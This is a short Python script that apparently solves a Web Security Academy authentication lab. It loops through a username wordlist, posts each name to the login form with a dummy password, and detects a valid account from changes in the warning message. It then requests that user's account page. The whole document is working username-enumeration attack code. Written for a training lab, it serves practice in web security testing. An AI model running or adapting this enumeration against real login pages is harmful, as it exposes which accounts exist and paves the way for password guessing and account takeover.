import requests
import sys
from bs4 import BeautifulSoup

s = requests.Session()

site = 'ac921fe71e3f702080b16df6008b00d2.web-security-academy.net'

login_url = f'''https://{site}/login'''

resp = s.get(login_url)
soup = BeautifulSoup(resp.text,'html.parser')

lines = open("auth-lab-usernames","r").readlines()

for user in lines:
    target = user.strip()
    logindata = {
        'username' : target,
        'password' : 'foo'
    }

    resp = s.post(login_url, data=logindata)
    soup = BeautifulSoup(resp.text,'html.parser')
    try:
      if 'username' not in soup.find('p', {'class':'is-warning'}).text:
          print(f'username is {target}')
          break
    
    except:
      print(f'username is {target}')
      break
    


s.get(f'https://{site}/my-account?id={target}')

'''Username for part 3 (Reconstructed)'''